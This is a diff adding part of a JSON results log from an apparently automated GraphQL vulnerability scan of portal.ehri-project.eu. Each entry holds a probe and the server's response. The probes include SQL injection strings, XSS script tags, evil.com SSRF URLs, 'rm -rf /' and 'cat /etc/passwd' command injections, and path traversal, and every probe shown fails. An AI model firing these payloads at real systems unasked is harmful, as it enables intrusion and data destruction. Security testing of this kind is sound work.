+          "message": "Validation error (FieldUndefined@[Link/descriptio]) : Field 'descriptio' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"LNK001\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.59,
+    "timestamp": "2025-10-05T20:45:00.523684Z",
+    "count": 43,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"LNK001' OR '1'='1\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.424,
+    "timestamp": "2025-10-05T20:45:03.834945Z",
+    "count": 44,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"<script>alert('xss')</script>\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.843,
+    "timestamp": "2025-10-05T20:45:07.394687Z",
+    "count": 45,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"http://evil.com/data\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.34,
+    "timestamp": "2025-10-05T20:45:11.462191Z",
+    "count": 46,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"; rm -rf /\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.481,
+    "timestamp": "2025-10-05T20:45:14.708511Z",
+    "count": 47,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"../../etc/passwd\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.244,
+    "timestamp": "2025-10-05T20:45:19.732407Z",
+    "count": 48,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"<h1>Hello World!</h1>\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.479,
+    "timestamp": "2025-10-05T20:45:22.099851Z",
+    "count": 49,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery MyLink {\n  s: Link(id: \"LNK001\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.465,
+        "timestamp": "2025-10-05T20:45:24.381557Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.524,
+        "timestamp": "2025-10-05T20:45:24.905378Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 50,
+    "timestamp": "2025-10-05T20:45:24.905410Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 2.385,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 4.582,
+    "timestamp": "2025-10-05T20:45:34.177013Z",
+    "count": 51,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Link]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/types]) : Field 'types' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"LNK001\") {\n    id\n    typ\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 7.017,
+    "timestamp": "2025-10-05T20:45:42.858368Z",
+    "count": 52,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/typ]) : Field 'typ' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.531,
+    "timestamp": "2025-10-05T20:45:51.012536Z",
+    "count": 53,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123' OR 1=1 --\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.475,
+    "timestamp": "2025-10-05T20:45:54.039003Z",
+    "count": 54,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123\") {\n    id\n    type\n    description\n    field\n    annotations {\n      body\n      by\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.866,
+    "timestamp": "2025-10-05T20:45:56.628625Z",
+    "count": 55,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"http://attacker.com/malicious-link\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.288,
+    "timestamp": "2025-10-05T20:46:00.577722Z",
+    "count": 56,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123; cat /etc/passwd\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.505,
+    "timestamp": "2025-10-05T20:46:02.719869Z",
+    "count": 57,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123/../../etc/passwd\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.996,
+    "timestamp": "2025-10-05T20:46:07.022453Z",
+    "count": 58,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123\") {\n    id\n    type\n    description\n    linkType\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "response_status": null,
+    "request_time_seconds": 10.008,
+    "response_body": {
+      "error": "HTTPSConnectionPool(host='portal.ehri-project.eu', port=443): Read timed out. (read timeout=10)"
+    },
+    "timestamp": "2025-10-05T20:46:19.748596Z",
+    "count": 59
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  l: Link(id: \"link-123\") {\n    id\n    type\n    description\n    linkType\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.982,
+        "timestamp": "2025-10-05T20:46:20.730414Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.515,
+        "timestamp": "2025-10-05T20:46:21.245594Z",
+        "response_body": {
+          "data": {
+            "l": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 60,
+    "timestamp": "2025-10-05T20:46:21.245743Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.486,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link {\n    types {\n      name\n      kind\n      description\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.494,
+    "timestamp": "2025-10-05T20:46:24.833333Z",
+    "count": 61,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Link]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/types]) : Field 'types' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123\") {\n    id\n    typ\n    descriptio\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.598,
+    "timestamp": "2025-10-05T20:46:27.631483Z",
+    "count": 62,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/typ]) : Field 'typ' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/descriptio]) : Field 'descriptio' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-001\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.468,
+    "timestamp": "2025-10-05T20:46:33.227687Z",
+    "count": 63,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-sql-001' OR 1=1 --\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.556,
+    "timestamp": "2025-10-05T20:46:36.117871Z",
+    "count": 64,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-xss-001\") {\n    id\n    type\n    description\n    field\n    annotations {\n      body\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.453,
+    "timestamp": "2025-10-05T20:46:38.815581Z",
+    "count": 65,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-ssrf-001\") {\n    id\n    type\n    description\n    source {\n      ... on AccessPoint {\n        id\n        name\n        type\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.451,
+    "timestamp": "2025-10-05T20:46:41.316599Z",
+    "count": 66,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (InvalidFragmentType@[Link/source]) : Fragment cannot be spread here as objects of type 'Linkable' can never be of type 'AccessPoint'",
+          "locations": [
+            {
+              "line": 8,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-cmd-001\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.468,
+    "timestamp": "2025-10-05T20:46:44.416824Z",
+    "count": 67,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"../../../etc/passwd\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.036,
+    "timestamp": "2025-10-05T20:46:47.775508Z",
+    "count": 68,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-html-001\") {\n    id\n    type\n    description\n    field\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.445,
+    "timestamp": "2025-10-05T20:46:50.971299Z",
+    "count": 69,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"normal-link-001\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.871,
+        "timestamp": "2025-10-05T20:46:54.721150Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.817,
+        "timestamp": "2025-10-05T20:46:56.537937Z",
+        "response_body": {
+          "data": {
+            "aliasedLink": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 70,
+    "timestamp": "2025-10-05T20:46:56.538035Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.445,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery bypassLink {\n  aliasedLink: Link(id: \"aliased-link-001\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.528,
+        "timestamp": "2025-10-05T20:46:59.349218Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.509,
+        "timestamp": "2025-10-05T20:46:59.858716Z",
+        "response_body": {
+          "data": {
+            "aliasedLink": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 71,
+    "timestamp": "2025-10-05T20:46:59.858776Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.903,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  Link {\n    types {\n      name\n      kind\n      fields {\n        name\n        type {\n          name\n          kind\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.535,
+    "timestamp": "2025-10-05T20:47:04.032826Z",
+    "count": 72,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Link]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/types]) : Field 'types' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-suggest-001\") {\n    id\n    typ # Typo to trigger suggestion if available\n    descriptio\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.65,
+    "timestamp": "2025-10-05T20:47:06.886580Z",
+    "count": 73,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/typ]) : Field 'typ' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/descriptio]) : Field 'descriptio' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.937,
+    "timestamp": "2025-10-05T20:47:12.109926Z",
+    "count": 74,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123' OR 1=1 --\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.508,
+    "timestamp": "2025-10-05T20:47:15.165534Z",
+    "count": 75,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123<script>alert('XSS')</script>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.825,
+    "timestamp": "2025-10-05T20:47:18.554816Z",
+    "count": 76,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"http://evil.com/data\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": null,
+    "request_time_seconds": 10.006,
+    "response_body": {
+      "error": "HTTPSConnectionPool(host='portal.ehri-project.eu', port=443): Read timed out. (read timeout=10)"
+    },
+    "timestamp": "2025-10-05T20:47:30.913079Z",
+    "count": 77
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123; cat /etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": null,
+    "request_time_seconds": 10.012,
+    "response_body": {
+      "error": "HTTPSConnectionPool(host='portal.ehri-project.eu', port=443): Read timed out. (read timeout=10)"
+    },
+    "timestamp": "2025-10-05T20:47:40.925422Z",
+    "count": 78
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123/../../etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.63,
+    "timestamp": "2025-10-05T20:47:41.555986Z",
+    "count": 79,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-123<h1>Hello HTML</h1>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.179,
+    "timestamp": "2025-10-05T20:47:44.869486Z",
+    "count": 80,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-456\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.464,
+        "timestamp": "2025-10-05T20:47:48.008172Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.917,
+        "timestamp": "2025-10-05T20:47:48.925031Z",
+        "response_body": {
+          "data": {
+            "aliasedLink": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 81,
+    "timestamp": "2025-10-05T20:47:48.925140Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.788,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery DenyBypass {\n  aliasedLink: Link(id: \"link-456\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.491,
+        "timestamp": "2025-10-05T20:47:52.704714Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.071,
+        "timestamp": "2025-10-05T20:47:53.776302Z",
+        "response_body": {
+          "data": {
+            "aliasedLink": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 82,
+    "timestamp": "2025-10-05T20:47:53.776333Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.535,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.504,
+    "timestamp": "2025-10-05T20:47:56.400662Z",
+    "count": 83,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Link]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/types]) : Field 'types' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-789\") {\n    iD # Intentional typo to trigger suggestions\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.466,
+    "timestamp": "2025-10-05T20:47:58.378109Z",
+    "count": 84,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/iD]) : Field 'iD' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link_id_abc_123\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.183,
+    "timestamp": "2025-10-05T20:48:04.529141Z",
+    "count": 85,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"1' OR '1'='1'; -- \") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.877,
+    "timestamp": "2025-10-05T20:48:07.798337Z",
+    "count": 86,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"<script>alert('xss')</script>\") {\n    id\n    description\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.897,
+    "timestamp": "2025-10-05T20:48:10.332638Z",
+    "count": 87,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"http://evil.com/data\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.557,
+    "timestamp": "2025-10-05T20:48:13.081818Z",
+    "count": 88,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"; rm -rf /; echo \") {\n    id\n    description\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
